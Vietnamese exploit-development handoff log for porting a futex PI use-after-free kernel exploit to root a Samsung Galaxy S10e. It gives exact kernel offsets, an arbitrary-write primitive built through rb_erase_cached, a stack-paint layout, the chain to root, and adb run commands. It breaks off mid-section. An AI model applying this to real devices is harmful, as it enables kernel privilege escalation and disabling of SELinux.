# BÀN GIAO — GhostLock port sang Samsung SM-G970W (4.14.190)

> Bản này là **nguồn sự thật hiện tại**. `HANDOFF.md` (§0/§11) và `KET_LUAN_4.14.md`
> (nhật ký chi tiết từng chặng) là tài liệu bổ trợ; khi mâu thuẫn, **ưu tiên file này**.
>
> **⟶ Đọc §12 trước** (phiên 2026-10-10 / phần 2): §11 nói nút thắt là "hình học vùng
> waiter" — **điều đó SAI**, xem §12. §5/§6/§7 (reclaim / SLUB) là *lịch sử*, đã bị bác bỏ.

## 0. Mục tiêu & bối cảnh
- Root **SM-G970W (Galaxy S10e, Snapdragon 855, kernel 4.14.190, bootloader khoá cứng)**
  bằng port **GhostLock (CVE-2026-43499, futex PI use-after-free)** — root KHÔNG cần mở BL.
- Trần: `MODULE_SIG_FORCE=y` ⇒ **không cài KernelSU**, chỉ root tạm (+ SELinux off).
- Exploit gốc: `JoinChang/ghostlock-oneplus`. Bản port: WSL `~/ghostlock/ghostlock-oneplus`
  (nhiều sửa **chưa commit**; `git HEAD` chỉ có docs commit).

## 1. Môi trường & đường dẫn
- adb: `E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe`
- Tài liệu/script phân tích: `E:\Library\Desktop\ghostlock\` (Windows)
- Repo exploit: WSL `~/ghostlock/ghostlock-oneplus`
- Kernel source 4.14 máy: WSL `~/ghostlock/src/g9700`
- Ground truth disasm: WSL `~/ghostlock/kernel/Image`, `kallsyms_fixed.txt`
- Build toolchain: WSL `aarch64-linux-gnu-gcc` + `arm-linux-gnueabihf-gcc`

## 2. Kernel — dữ kiện đã xác nhận
- `uname -r` = `4.14.190-23725627-abG970WVLU9IXE1` (bảng offset `devices/beyond0q/offsets.h`).
- Image base `0xffffff8008000000` (đã verify bằng byte-pattern); KASLR slide ví dụ `0x2500000`.
- `PAGE_OFFSET = 0xffffffc000000000`, VA_BITS=39, `CONFIG_ARM64_PAN=y`, `CONFIG_COMPAT=y`.
- `PANIC_ON_OOPS=y` ⇒ mỗi lần sai = reboot. `/data/log/dumpstate_lastkmsg_*.log.gz` = ZIP
  (shell ở group `log`) → đọc bằng `show_crash.py`.

## 3. Kiến trúc khai thác HIỆN TẠI (1 tiến trình, như repo gốc)
```
run_exploit → "UMH path: fops redirect (mode=4)"
  do_one_write(data_addr(ASHMEM_MISC_FOPS), mode=4):
    1) prepare_good_kernel_page()  → KernelSnitch leak mm_struct + spray trang giả (skb)
    2) run_main_route_threads():
       - T (waiter): LOCK_PI(f_pi_chain) → WAIT_REQUEUE_PI(f_wait→f_pi_target) [block]
       - owner:      LOCK_PI(f_pi_target) → LOCK_PI(f_pi_chain) [block]
       - main:       CMP_REQUEUE_PI(f_wait→f_pi_target) → EDEADLK
                     ⇒ bug remove_waiter ⇒ T->pi_blocked_on trỏ waiter trên STACK T
       - T vào ROUTE (setsockopt):
           buf[0x40]=fake_task, buf[0x48]=fake_lock
           setsockopt(fd, SOL_SOCKET, 1000, buf, len)   ← PAINT (offset hằng)
           pselect_select_done=1 ; punch_consume_go=attempt ; SPIN userspace (no syscall)
       - consumer: chờ select_done → usleep(≥20ms) → sched_setattr(T)
           → rt_mutex_adjust_prio(T) → lock = waiter->lock
           → trylock(fake_lock->wait_lock) → rb-tree ops = PI WRITE
       - route tự gọi try_cfi_stage() (route_only_mode=0)
    3) try_cfi_stage(): ashmem/configfs r/w kiểm redirect → leak KASLR → pipe physrw → root
```
Env điều khiển: `ROUTE_SETSOCKOPT=1` (dùng route mới), `NO_SLIDE=1`,
chẩn đoán `SSOPT_SCAN=1` / `SSOPT_RANGE=1` / `SSOPT_LOG=1` / `FAKE_LOCK_OVERRIDE=<hex>`.

## 4. Hình học & hằng số CHUẨN 4.14 (từ disasm + source máy)
| Thứ | Giá trị |
|---|---|
| `setsockopt` stack buffer | `SP0-0x1c0` (SyS_setsockopt 0x50 + sock_setsockopt 0x180, buf=sp+0x10) |
| `SyS_futex` (native & compat) | frame `0x70`; `do_futex` 0x210 |
| dangling waiter (T's stack) | **`SP0-0x1b0`** |
| waiter fields | `tree@0x00`, **`pi_tree@0x18`**, `task@0x30`, `lock@0x38`, `prio@0x40`, `deadline@0x48` |
| ⇒ paint slots | **`task@buf[0x40]`, `lock@buf[0x48]`** |
| `rt_mutex` | `wait_lock@0`, `waiters.rb_root@0x08`, `rb_leftmost@0x10`, `owner@0x18`; `rt_mutex_owner` mask `~1` |
| `task_struct` | `prio@0xA8`, `usage@0x68`, `pi_lock@0x924`, `pi_waiters@0x930`, `pi_top_task@0x940`, `pi_blocked_on@0x948` |
| `miscdevice.fops` | `&ashmem_misc + 0x10` ⇒ `ASHMEM_MISC_FOPS_OFF = 0x02BB1760` |
| skb | `sizeof(skb_shared_info)=0x150`→align `0x180` ⇒ `SKB_MAX_HEAD(0)=0xE80` = `LOCK_OFF`; `SKB_DATA_DELTA=-0xE80` |

## 5. Việc ĐÃ SỬA (phiên này, không đoán — suy từ source/disasm)
1. **Route `setsockopt`** thay `select`/`pselect`: offset cố định, bỏ `shift`, bỏ ABI 32-bit,
   bỏ `res_*`. (fops.c `do_setsockopt_fake_lock_route`, dispatch qua `ROUTE_SETSOCKOPT`.)
2. `off_ashmem_misc_fops` (bảng beyond0q): `0x02BB1750 → 0x02BB1760` (field `.fops`, +0x10).
3. `FAKE_WAITER_PI_TREE_ENTRY_OFF`: `0x28 → 0x18` (RSO `waiter_pi_tree_off`).
4. `FAKE_TASK_USAGE_OFF`: `0x40 → 0x68` (RSO `task_usage_off`).
5. **KernelSnitch**: `__do_increase` thêm `pthread_detach`; `kernelsnitch_cleanup` **`FUTEX_WAKE`
   lặp** trước `munmap` (chống leak **4096 thread** block futex).
6. **Bỏ cơ chế cha–con**: `do_one_write` chạy 1 tiến trình (spray → route ngay), như repo gốc.

## 6. Tiến triển & BLOCKER hiện tại
- ✅ Paint **trúng** trong full flow (`kp41`: `x24 = 0x1a2b00000048` = slot `buf[0x48]`).
- ✅ Walk **vào được trang giả** (`kp43`: `x24 = fake_lock` = `base`; `pc=adjust_prio_chain+0x2ec`).
- ❌ **BLOCKER: reclaim không đặt fake-page vào `base`** — `kp43`: `[base+0x10]=0`
  (đáng lẽ `fake_w0`) ⇒ `BUG_ON(w->lock != lock)` deref `[0+0x38]`.
- Nghi (theo thứ tự):
  1. KernelSnitch leak **`current->mm`** (mm của chính exploit) ⇒ trang order-3 **không free được**
     ⇒ skb frag không thể cấp vào `base` (offset 0).
  2. `kill_child(prepare_ctx.childs)` chạy **SAU** `sendmsg` reclaim ⇒ slab chưa về free-list lúc reclaim
     (cần đối chiếu thứ tự với repo gốc).
  3. (CPU đã ok: free & `sendmsg` cùng `CORE`.)

## 7. Build / chạy / debug
```
# build (trong WSL)
bash /mnt/e/Library/Desktop/ghostlock/build14.sh /tmp/ghostlockNA     # aarch64
bash /mnt/e/Library/Desktop/ghostlock/build32.sh /tmp/ghostlockNB     # armhf (nếu cần)
cp /tmp/ghostlockNA /mnt/e/Library/Desktop/ghostlock/ghostlockNA_a64

# chạy (từ máy Windows)
$adb='E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe'
& $adb push ...\ghostlockNA_a64 /data/local/tmp/ghostlockNA
& $adb shell "chmod 755 /data/local/tmp/ghostlockNA; cd /data/local/tmp && ROUTE_SETSOCKOPT=1 NO_SLIDE=1 timeout 90 ./ghostlockNA > gl.log 2>&1"
& $adb reconnect offline      # khi adb mất device (thường sau panic)

# đọc panic
$n=(& $adb shell "ls -t /data/log/dumpstate_lastkmsg_*.log.gz | head -1").Trim()
cmd /c "`"$adb`" exec-out cat $n > kpnew.gz"
wsl -e bash -lc 'cd /mnt/e/Library/Desktop/ghostlock && python3 show_crash.py kpnew.gz 0 60'
```

## 8. Bộ công cụ (Windows `E:\Library\Desktop\ghostlock\`)
- `show_crash.py <kp.gz> <from> <count>` — dump panic trace.
- `analyze_lk.py`, `extract_lk2.py` — harvest `/data/log` ZIP.
- `geom_scan3.py`, `analyze_one.py`, `sym_at.py` — quét syscall/offset offline từ Image.
- `build14.sh`, `build32.sh`, `patch_*.py` — build & driver sửa code.

## 9. Việc kế tiếp (đề xuất)
1. **Audit KernelSnitch leak**: xác định `leaked` chính xác là mm_struct nào (own mm hay
   của child) — xem `kernelsnitch.h` (`futex_hash(addr, current->mm)`, `__mm_leak`,
   `IDENTITY_START/END` của port có khớp linear map 4.14 `0xffffffc0…`).
2. **Đối chiếu thứ tự reclaim với repo gốc** (`git show HEAD:src/core/util.c`): repo gốc
   `kill_child(prepare_ctx)` trước hay sau `sendmsg` reclaim? `pcp_shaping`?
3. Nếu đúng là own-mm: tìm cách khiến **trang chứa fake-page là trang free được** (vd. leak
   mm của một `clone_child` rồi kill nó), hoặc dùng `MM_ORDER`/`MM_STRUCT_SZ` đúng để slab
   split về order-0.
4. Sau khi reclaim đúng: kỳ vọng walk hoàn tất PI write (ghi `fake_fops` vào `.fops`) ⇒
   `try_cfi_stage()` chạy ⇒ xử tiếp CFI/configfs → pipe physrw → root.

## 10. Việc xa hơn (đã biết)
- `PIPE_TMP_PAGE_OFF/BUFS_OFF/USER_OFF/SIZE` trong `target.h` là giá trị 5.x; 4.14 thật:
  `tmp_page@0x68, bufs@0x80, user@0x88, sizeof≈0x90` — cần sửa khi tới physrw.

## 11. Cập nhật phiên 2026-10-10 — hướng 2 (perf page) + audit vùng waiter

> Chi tiết đầy đủ: **`PHIEN_2026-10-10.md`** (cùng thư mục). Đã copy vào repo exploit
> (`ghostlock-oneplus/PHIEN_2026-10-10.md`).

- ✅ **Hướng 2 THÀNH CÔNG:** leak page giả bằng `perf REGS_INTR` (memfd self-copy) + nạp fake image
  vào chính page đó ⇒ walk đi qua `trylock`/`top_waiter` tới **rb‑tree PI write**
  (`rb_erase_cached`). **Blocker cũ (`+0x2ec`, `[base+0x10]=0`) đã phá.** (`kp43` → `kppc`)
- Xác nhận SLUB 4.14 **giữ** slab mm rỗng → hướng gốc (free slab mm + reclaim) **bỏ**.
- **Nút thắt mới:** `waiter = SP0-0x1b0` nằm **trong frame của mọi syscall sâu** ⇒
  - `setsockopt`: `task/lock` trúng, `tree_entry` bị phá (exit path);
  - `pselect`/`select` (block): `tree_entry` OK nhưng `task/lock` (res_in mirror) ra `0`.
- **Đường ra đề xuất:** syscall block có **buffer user-writable** phủ waiter — ứng viên `ppoll`
  (`stack_pps` + block trong `do_poll`). Việc kế: disasm `do_sys_poll` lấy offset `stack_pps`.

*Ghi chú: ghi ngày 2026-10-09 — cập nhật 2026-10-10 (thêm §11).*

---

## 12. CẬP NHẬT PHIÊN 2026-10-10 (phần 2) — nút thắt là **NỘI DUNG SƠN**, không phải hình học

> Nguồn: kiểm chứng lại chính Image + source 4.14 của máy + code exploit + toàn bộ `kp*.gz`.
> Chi tiết đầy đủ: `PHIEN_2026-10-10.md` §9.

### 12.1 Ba đính chính bắt buộc (các mục dưới đã sai)

1. **ppoll KHÔNG dùng được** (đề xuất "việc kế tiếp" của §11). Disasm máy:
   `SyS_poll` frame 0x60, `do_sys_poll` = `stp [sp,#-96]!` + `sub sp,#0x3a0` ⇒ frame **0x400**;
   mảng `pollfd` (`add x23,x21,#0xc`) ở **SP0-0x3f4** (qua `sys_ppoll` còn thấp hơn).
   Waiter ở SP0-0x1b0 ⇒ cách 0x154, **không chồng**, mà frame `do_sys_poll` còn **trùm** vùng waiter.
2. **`CONFIG_SYSVIPC is not set`** (từ `s10-config.gz`) ⇒ `semop/semtimedop/msgsnd/msgrcv`
   chỉ là stub ENOSYS (kallsyms: cùng trỏ `0x805be24`); `POSIX_MQUEUE` cũng off ⇒ nhóm
   "syscall block có buffer user-writable" trên máy này **gần như rỗng** (chỉ còn `select/pselect6`).
   `ptrace` không block ở 4.14; `recvmsg/sendmsg` bị `rw_copy_check_uvector` validate.
3. **Bảng panic trong `PHIEN` §6 dán nhãn sai** (`kppc.gz` = *ghostlockNB*, không phải ghostlockPC;
   `kpS2.gz` = ghostlockPC; `kpE.gz` = ghostlockPD). Bảng đúng ở `PHIEN` §9.1.

### 12.2 Chẩn đoán mới: blocker là **nội dung sơn `waiter->tree_entry`**

Bằng chứng phản bác "hình học": `kp27` (ghostlock43) và `kp38/41/42` (SCAN) cho
`x24` = **đúng giá trị đã sơn** (`fake_lock`, `0x1a2b00000048`) ⇒ `buf[0x48] → waiter+0x38`
là **chính xác tuyệt đối**, không có chuyện "syscall sau xoá mất" khi T spin-park.

Vấn đề thật: **route `setsockopt` mới chỉ sơn `task`/`lock`, bỏ trống `tree_entry`**,
trong khi `tree_entry` chính là payload của lần ghi PI (route `pselect` cũ *có* sơn nó,
nhưng `task/lock` lại rơi vào `res_out` bị kernel zero ⇒ `lock=0`). Hai route bù trừ nhau.

Suy trực tiếp từ `rb_erase_cached` (`lib/rbtree_augmented.h`, case 1 vì `rb_left == 0`):

```
child = node->rb_right            // = TARGET (địa chỉ đích)
pc    = node->__rb_parent_color   // = VALUE  (giá trị cần ghi)
__rb_change_child(node, child, parent = pc & ~3, root)
if (child) { child->__rb_parent_color = pc; rebalance = NULL; }
        └── *TARGET = VALUE  (và KHÔNG chạy ____rb_erase_color vì child != NULL)
```
⇒ **`tree_entry = (parent_color, rb_right, rb_left) = (VALUE, TARGET, 0)`**.
Đúng bộ ba `write_pc/write_right/write_left` mà `prepare_skb_payload()` đặt cho `W0`'s pi_tree
(với mode 4: `write_pc = fake_fops`, `write_right = data_addr(ASHMEM_MISC_FOPS)`).
Phụ phẩm `*(parent->rb_right)` = `fake_fops+0x08` = slot `llseek` của fops giả — chính là lý do
tồn tại `repair_fake_fops_llseek()`.

### 12.3 Yêu cầu mới bắt buộc: **phải sơn `waiter->prio`**

`rt_mutex_adjust_pi()` và `rt_mutex_adjust_prio_chain[3]` đều có
`if (rt_mutex_waiter_equal(waiter, task_to_waiter(task))) goto out_unlock_pi;`
(`task_to_waiter(p) = &(rt_mutex_waiter){ .prio = p->prio, .deadline = p->dl.deadline }`).
Nếu `waiter->prio == task->prio` ⇒ walk **thoát êm, không ghi gì** (triệu chứng kiểu "EINVAL câm").
Do đó sơn `buf[0x50] -> waiter+0x40 = FAKE_WAITER_PRIO (140)` (≠ prio 120 của luồng exploit;
140 > 120 còn giữ W nằm trái `fake_w0` để `chain[11]` thấy `waiter == rt_mutex_top_waiter(lock)`).

### 12.4 Bản đồ sơn chuẩn (đã kiểm bằng số)

```
buf = SP0-0x1c0 ; waiter = SP0-0x1b0 = buf+0x10 ; optlen = 0x60 (kernel cap min(optlen,0xfe))
buf[0x10] -> waiter+0x00  tree.parent_color = VALUE      (ssopt_write_pc)
buf[0x18] -> waiter+0x08  tree.rb_right     = TARGET     (ssopt_write_right)
buf[0x20] -> waiter+0x10  tree.rb_left      = 0          (ssopt_write_left)
buf[0x40] -> waiter+0x30  task              = fake_task / INIT_TASK
buf[0x48] -> waiter+0x38  lock              = fake_lock
buf[0x50] -> waiter+0x40  prio              = FAKE_WAITER_PRIO
buf[0x58] -> waiter+0x48  deadline          = 0
```
**Không được chèn `select()` sau paint**: `res_out/res_ex` của `core_sys_select(n=192)` nằm đúng
`SP0-0x1b0..SP0-0x180` (= `waiter+0x00..0x2f`) và `zero_fd_set()` xoá trắng `tree_entry` vừa sơn.
Giữ **spin-park userspace** (kp27 đã chứng minh paint sống sót).

### 12.5 Đã sửa code (chưa build/chạy máy tại thời điểm ghi)

- `fops.c::do_setsockopt_fake_lock_route()`: sơn đủ 8 word, `paint_len = 0x60`, **bỏ `select(192)`**,
  giữ các nhánh diagnostic `SSOPT_SCAN/SCAN2/RANGE/LOG`, thêm log readback khi `WRITE4_SCRATCH=1`.
- `util.c`: publish `ssopt_write_pc/right/left` từ `prepare_skb_payload()` (guard: `left==0`,
  `pc!=0`, `right!=0`, nếu không thì để 0 và rơi về nhánh tree_entry=0 an toàn),
  thêm `ssopt_page_readback()` (đọc lại qword trang giả qua MAP_SHARED).
- `common.h`: extern 3 biến + khai báo `ssopt_page_readback()`.
- Patch script: `patch_ssopt_paint.py`, `patch_ssopt_readback.py` (idempotent-check bằng assert).
- Revert: `git checkout -- src/core/fops.c src/core/util.c src/core/common.h` (HEAD `a0b3e2f`).

### 12.6 Trình tự chạy (self-test trước, rủi ro ~0)

```bash
bash /mnt/e/Library/Desktop/ghostlock/build14.sh /tmp/ghostlockPA
```
```powershell
# (a) self-test: write_right trỏ vào chính trang giả (base+0x3C0) -> đọc lại được
& $adb shell "cd /data/local/tmp && WRITE4_SCRATCH=1 ROUTE_SETSOCKOPT=1 NO_SLIDE=1 timeout 90 ./ghostlockPA > gl.log 2>&1"
# kỳ vọng: "ssopt scratch readback ... walked=1 page[0x1240]=<X> want=<fake_fops>" và X == want, KHÔNG panic
# (b) nếu (a) đạt:
& $adb shell "cd /data/local/tmp && ROUTE_SETSOCKOPT=1 NO_SLIDE=1 timeout 90 ./ghostlockPA > gl.log 2>&1"
```

### 12.7 Chữ ký panic → nguyên nhân

| pc | fault VA | nghĩa |
|---|---|---|
| `rb_erase_cached+0x20` | rác non-canonical | `waiter->tree_entry.rb_right` bị đè ⇒ **race ghi stack** (không phải geometry) |
| `rt_mutex_adjust_prio_chain+0x2ec` | `0x38` | `fake_lock->waiters.rb_leftmost` sai ⇒ `BUG_ON(w->lock != lock)` (`rtmutex_common.h:59`) |
| `_raw_spin_trylock+0x1c` | `value`/`0` | `waiter->lock` sai ⇒ paint trượt |
| walk kết thúc êm nhưng `walked=0` | — | `rt_mutex_waiter_equal` bail (prio) hoặc `chain[3]/[6]` |

### 12.8 Còn mở

Nếu (a) vẫn panic ở `rb_erase_cached+0x20`: đó là **race đè stack** sau paint (nghi consumer bắn
ở khe giữa 2 attempt, hoặc `pr_info` cuối attempt của chính T) ⇒ cần log mốc thời gian
attempt/`punch_consume_go`/consumer, sửa bằng thứ tự chứ không bằng offset.

*Ghi 2026-10-10 (phần 2). Trạng thái: paint đã đủ 8 word; chờ build + self-test `WRITE4_SCRATCH=1`.*

---

## 13. NHẬT KÝ CHẠY MÁY (2026-10-10 phiên 2) — có ĐÌNH CHỈNH so với §12.5–§12.6

> Mục này là **nhật ký thực nghiệm**; §12.5/§12.6 mô tả thiết kế *dự kiến*, §13 nói *thực tế đã xảy ra*.
> Mọi con số lấy từ log + `/data/log/dumpstate_lastkmsg_*.log.gz`.

### 13.1 Cải tiến quy trình (giữ lại, rất quan trọng)

- **Log phải `fsync`** mới sống qua panic: panic làm mất page cache ⇒ `gl.log` = **0 byte**
  suốt 5 lần liên tiếp. Đã thêm `setvbuf(stdout,·,_IONBF,·)` (main.c) **và** `fsync(1)` sau các
  dòng chẩn đoán (fops.c) ⇒ từ build `QD` log sống sót (1679 byte sau panic) ✓.
- Sau panic **chờ 30–60 s** (máy reboot ~2–3 phút) rồi mới gửi lệnh adb; gửi sớm thì lệnh
  *không chạy* (thấy rõ: `gl.log` giữ mtime cũ) ⇒ dễ tưởng "không có kết quả".
- Bảng panic phải tra theo **tên tiến trình trong dump** (không theo số thứ tự file —
  số thứ tự/tên thời gian *lệch* một boot).

### 13.2 Kết quả từng run (đầy đủ, không suy diễn)

| run | binary | tham số | kết quả |
|---|---|---|---|
| PA | ghostlockPA | `WRITE4_SCRATCH=1` | **không panic**; `walked=1 success=1`; readback sai offset (quên `SKB_DATA_DELTA`) ⇒ vô nghĩa |
| QA | ghostlockQA (paint 8 word + bỏ select, spin-park) | `SSOPT_PEEK=1` | **không panic**; peek: **trang giả nguyên vẹn** (rb_root/rb_leftmost/W0 chưa bị chạm) ⇒ walk **không làm gì**; `cfi write=-1 errno=EINVAL` |
| QA2 | ghostlockQA | `PSELECT_ROUTE_DELAY_USEC=0` | **panic** `rb_erase_cached+0x20`, `rb_right` rác (`1c89ccb9f41531`) ⇒ walk **vào tới [7]** với children rác |
| PB | ghostlockPB (peek) | `SSOPT_PEEK=1` | panic `rb_erase_cached+0x20`, rác `d9869b3f41a26fa8` (giống kpr/kpP) |
| QB | ghostlockQB (v3: hold=`select(64)` nhưng `pipe()` đặt **sau** paint) | — | panic `_raw_spin_trylock+0x1c`, **VA=0** (`waiter->lock=0`) — do chính `pipe()/fcntl()` sau paint đè waiter |
| QC ×3 | ghostlockQC (v4: pipe ở prologue + unbuffered) | `SSOPT_PEEK=1` | panic `trylock+0x1c`, **VA=0**, `x24=0`, `x25=…bd10` (đúng chỗ waiter) ⇒ `waiter->lock = 0` |
| QD | ghostlockQD (v4 + fsync) | `SSOPT_SCAN=1` | log tới "pre paint" rồi mất máy; **không có dump** ⇒ nghi *treo* (watchdog), không fault |

### 13.3 Điều RÚT RA (quan trọng, đọc trước khi sửa tiếp)

1. **không** tái lập được `x24 = giá trị đã sơn` (kp27/kp41) bằng các build mới ⇒
   mọi panic mới là `waiter->lock = 0` (QB/QC: fault VA=0) hoặc walk bail câm (QA).
   ⇒ **paint hiện KHÔNG chắc tới được `waiter`**; đây là việc phải bisect, không phải
   chỉnh tiếp hình học/logic chain.
2. Nghi vấn hàng đầu: `copy_from_user` của optname 1000 **không copy** trong các run này
   (khi đó `memset(buf,0,0xff)` để lại **0** ⇒ `task=0, lock=0` ⇒ [5] `trylock(NULL)` ⇒
   **fault VA=0** ✓ khớp QB/QC). Cần kiểm: log `ret/errno` của setsockopt **và** một phép
   kiểm *nhìn thấy được* rằng stack đã nhận giá trị (SCAN + đọc `x24` từ dump).
3. Consumer mất **~5.7 s** trong kernel (PA/QA) ⇒ walk **lặp** nhiều vòng và **đọc lại** waiter;
   trong lúc đó T đang **spin ngoài userspace** ⇒ **IRQ vào T** (xử lý trên kernel stack của T,
   chuỗi IRQ từ el0 sâu ~0x1b0) **đè `waiter+0x08/+0x10`** ⇒ 3 kết cục đã thấy: bail câm,
   panic `rb_erase+0x20` với rác, treo. ⇒ Thiết kế gốc buộc T **block trong kernel** là đúng,
   nhưng cách làm phải **không phát syscall nào giữa paint và block** (xem 13.4).
4. Bằng chứng ủng hộ: `@0x2ec` (BUG_ON `rt_mutex_top_waiter`) và `trylock+0x1c` chỉ xảy ra khi
   `lock` đúng/0 tương ứng; `rb_erase+0x20` chỉ xảy ra khi children ≠ 0 ⇒ các ký hiệu này
   **phân biệt được** "paint không tới" vs "paint tới rồi bị đè".

### 13.4 Việc kế tiếp (đề xuất, bisect — mỗi bước 1 run)

1. **Tái lập baseline đã biết**: paint `len=0x50` (chỉ task@0x40, lock@0x48, **không** sơn prio,
   **không** sơn tree_entry), spin-park, chạy `SSOPT_SCAN=1` ⇒ **kỳ vọng `x24 = 0x1a2b00000048`**
   (như kp41). Nếu đạt ⇒ paint tới nơi, và lỗi nằm ở các thay đổi sau đó (prio/8-word/hold).
2. Nếu bước 1 **không** đạt ⇒ lỗi nằm trước paint: kiểm `ret/errno` của `setsockopt`, `sock_paint_fd`,
   và thêm vào scan một marker phân biệt để biết phần tử nào tới (`0x1a2b…` + offset).
3. Chỉ khi bước 1 đạt: bật lại **từng thay đổi một** (prio → tree_entry → hold) và sau mỗi bước
   xác nhận lại bằng `SSOPT_SCAN`/peek.
4. Giữ hold **trong kernel** (block) nhưng phải chuẩn bị `pipe()`/fd **trước** paint và
   giữa paint → block **không** syscall nào khác; `nfds` nhỏ (64) để `stack_fds` không phủ waiter.
5. Ghi nhớ: `FAKE_WAITER_PRIO=140` và consumer đặt nice 19 (`prio=139`) — nếu đổi nice/prio phải
   kiểm lại điều kiện `rt_mutex_waiter_equal()` (nếu trùng ⇒ walk bail **câm**).

### 13.5 Trạng thái code hiện tại (repo `ghostlock-oneplus`, sau các patch)

`patch_ssopt_paint.py`, `patch_ssopt_readback.py`, `patch_ssopt_peek.py`, `patch_ssopt_quiet_exit.py`,
`patch_ssopt_hold.py`, `patch_ssopt_v4.py`, `patch_ssopt_fsync.py` (theo thứ tự).
Có: paint 8 word + `paint_len=0x60`; `SSOPT_PEEK`; `ssopt_page_readback`; chặn signal + flush
task_work trước paint; hold `select(64)` (pipe tạo ở prologue); page FOPS `owner=0`
(`SSOPT_OWNER0=1`) + `W0.prio=100`; stdout unbuffered + `fsync` sau chẩn đoán.
**Lưu ý:** binary `ghostlockPC_a64` cũ (phiên trước) **đã bị ghi đè** — dùng tên `Q*` cho các bản mới.
Revert: `git checkout -- src/core/fops.c src/core/util.c src/core/common.h src/core/main.c`.

*Ghi 2026-10-10 (phiên 2, sau 7 lần chạy máy). Kết luận: tooling log đã tốt; paint/phối hợp
paint↔walk cần bisect lại từ baseline `len=0x50` + `SSOPT_SCAN`.*

---

## 14. BISECT KẾT QUẢ (2026-10-10, phiên 2 — sau các run QE..QH)

### 14.1 Phép thử "paint có tới stack không" (chốt hạ, không thể treo)

`SSOPT_LOCKPROBE=1`: paint `len=0x50`, `buf[0x40]=task`, `buf[0x48]=0x1a2b00000048`,
tree_entry = 0 ⇒ walk dừng ngay `chain[5] raw_spin_trylock(lock)` ⇒ **KP trong vài ms**,
`x24` cho biết kết quả (`0x1a2b00000048` = tới; `0` = không tới). Kết quả:

| run | cấu hình | `x24` | kết luận |
|---|---|---|---|
| QE | baseline: hold=0, quiet=0, owner0=0 (+SCAN) | **0x1a2b00000048** | **paint TỚI waiter+0x38** ✓ (giống kp41) |
| QF | LOCKPROBE, hold=0, quiet=0, owner0=0 | **0x1a2b00000048** | ✓ xác nhận lần 2 |
| QB/QC/QD | có **hold = `select()`** | **0** | **paint MẤT** ✗ |

⇒ **`select()` KHÔNG dùng được làm "hold"**: `core_sys_select` giữ `long stack_fds[32]`
= **256 byte** tại `sp+0x50` = `SP0-0x210..SP0-0x110`, tức **trùm cả `waiter`**; khi kernel
zero/ghi vùng đó thì mất `lock`/`task`/`tree_entry`. `nfds` nhỏ **không** cứu được (array vẫn
256 byte; chỉ `6*FDS_BYTES(n)` byte đầu là *sets*). ⇒ Bỏ hold khỏi thiết kế.

### 14.2 Run 8-word + hold=0 + quiet=0 (QF/QG/QH)

Log (đã fsync) **dừng ngay sau dòng "ssopt pre paint"**; **không có KP, không dump**, consumer
**không kịp** in peek (consumer-side peek chỉ in khi `sched_setattr` *trả về*) ⇒ **walk không trả
về** ⇒ nghi **hard-lockup** (walk giữ spinlock + IRQ off ⇒ watchdog reset, không Oops ⇒ không dump).
⇒ Phải bisect tiếp *bên trong* 3 field của paint (xem §14.4), không đoán.

### 14.3 Đã KIỂM & LOẠI TRỪ (đừng nghi lại)

- **Bảng fops giả ĐÚNG**: `src/devices/beyond0q/offsets.h` dùng layout `struct file_operations`
  thật của 4.14.190 (llseek 0x08, read 0x10, write 0x18, read_iter 0x20, write_iter 0x28,
  unlocked_ioctl 0x48, compat_ioctl 0x50, mmap 0x58, open 0x60, release 0x70, splice_read 0xb8,
  show_fdinfo 0xd0) — đối chiếu trực tiếp `include/linux/fs.h` của máy. Log peek cũng xác nhận
  `page[FOPS+0x08] = fake_w0+0x18` ✓. (Suy đoán "lệch +8" trước đó là do **đọc ngược nhãn**
  2 dòng log peek ⇒ đã bỏ.)
- `src/core/target.h`'s `FOPS_*_OFF` chỉ là **fallback**: `runtime_struct_offsets.h` `#undef`
  rồi `_RSO(field, default)` ⇒ sửa target.h **vô tác dụng**. Patch thử đã **revert**.
- `pipe()`/`fcntl()` đặt *sau* paint = tự đè waiter (build QB: `x24=0`) ⇒ mọi thứ syscall phải
  làm **trước** paint hoặc **không** làm.

### 14.4 Tooling đã thêm (giữ lại)

- `setvbuf(stdout,·,_IONBF,·)` + **`fsync(1)`** sau các dòng chẩn đoán ⇒ log **sống qua panic**
  (đã chứng minh: 1679/1720 byte còn nguyên sau panic; trước đó luôn 0 byte).
- **consumer-side peek**: in trạng thái trang giả *ngay sau* khi `sched_setattr(T)` trả về, từ
  *thread consumer* — sống sót kể cả khi walk hard-lock (in từ thread khác).
- `SSOPT_NO_CFI=1` để bỏ `try_cfi_stage()` khi chỉ muốn quan sát paint/walk.
- Cờ bisect (một build dùng cho tất cả): `SSOPT_BASELINE`, `SSOPT_SCAN`, `SSOPT_SCAN2`,
  `SSOPT_RANGE`, `SSOPT_LOCKPROBE`, `SSOPT_HOLD`, `SSOPT_QUIET_EXIT`, `SSOPT_OWNER0`,
  `SSOPT_NO_CFI`, `SSOPT_PEEK`, `SSOPT_LOG`; dòng "ssopt pre paint" in cả các cờ hiệu lực.
- Vận hành: sau panic **chờ 30–60 s** rồi mới gửi lệnh adb (gửi sớm ⇒ lệnh *không* chạy);
  tra panic theo **tên tiến trình trong dump** (số thứ tự/tên thời gian lệch 1 boot).

### 14.5 Việc kế tiếp (bisect bộ 3 field, mỗi bước 1 run)

Bật lại **từng field một** để tìm field làm walk không trả về (dùng marker như LOCKPROBE để
luôn có KP nhanh khi tới `chain[5]`, và consumer-side peek để thấy kết quả khi walk *trả về*):
1. task + lock (baseline) **+ tree_entry triple** (VALUE/TARGET/0), **không** sơn prio.
2. task + lock + **prio=140** (không tree_entry).
3. task + lock + tree_entry + prio (đủ 8 word) — chính là cấu hình đang treo.
Thêm 2 cờ mới cần thiết: `SSOPT_NO_TREE=1` (bỏ triple), `SSOPT_NO_PRIO=1` (bỏ prio).
Khi biết field gây treo ⇒ sửa (hoặc bỏ) nó rồi mới bật `try_cfi_stage` (bỏ `NO_CFI`).

*Ghi 2026-10-10 (phiên 2, phần 4). Kết luận: (1) paint tới nơi — đã chứng minh bằng marker;
(2) `select` làm hold là SAI (đè waiter) — bỏ; (3) cấu hình 8-word hiện làm walk không trả về
⇒ bisect 3 field; (4) bảng fops của beyond0q ĐÚNG; (5) tooling log/peek đã đủ tốt để không còn
lần chạy nào "mất dữ liệu".*

---

## 15. ĐÍNH CHÍNH: KHÔNG hề "treo" — các run đó **PANIC** (mình tra dump sai thời điểm)

> §14.2 nói "log dừng, không KP, không dump ⇒ nghi hard-lockup". **SAI.** Khi đọc *kernel log*
